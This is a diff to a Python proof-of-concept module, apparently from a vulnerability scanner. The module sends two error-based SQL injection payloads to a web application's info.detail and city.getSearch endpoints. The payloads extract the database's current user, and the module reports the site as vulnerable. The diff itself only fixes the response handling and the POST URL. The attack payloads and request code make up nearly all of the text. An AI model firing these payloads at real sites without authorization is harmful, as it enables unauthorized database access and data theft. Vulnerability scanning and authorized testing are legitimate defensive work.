@@ -49,12 +49,12 @@ class Poc(ABPoc):
             vulurl = '{target}'.format(target=self.target)
             payload = "/?m=info.detail&id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
             resp = requests.get(vulurl + payload)
-            re_result = re.findall(r'~~~(.*?)~~~', resp.content, re.S | re.I)
+            re_result = re.findall(r'~~~(.*?)~~~', resp.text, re.S | re.I)
             vulurl1 = "%s/?m=city.getSearch&index=xx" % vulurl
             payload1 = {
                 "key": "xxx' AND (SELECT 7359 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xx'='xx"}
-            resp1 = requests.post(vulurl, data=payload1)
-            re_result1 = re.findall(r'~~~(.*?)~~~', resp1.content, re.S | re.I)
+            resp1 = requests.post(vulurl1, data=payload1)
+            re_result1 = re.findall(r'~~~(.*?)~~~', resp1.text, re.S | re.I)
             if re_result:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
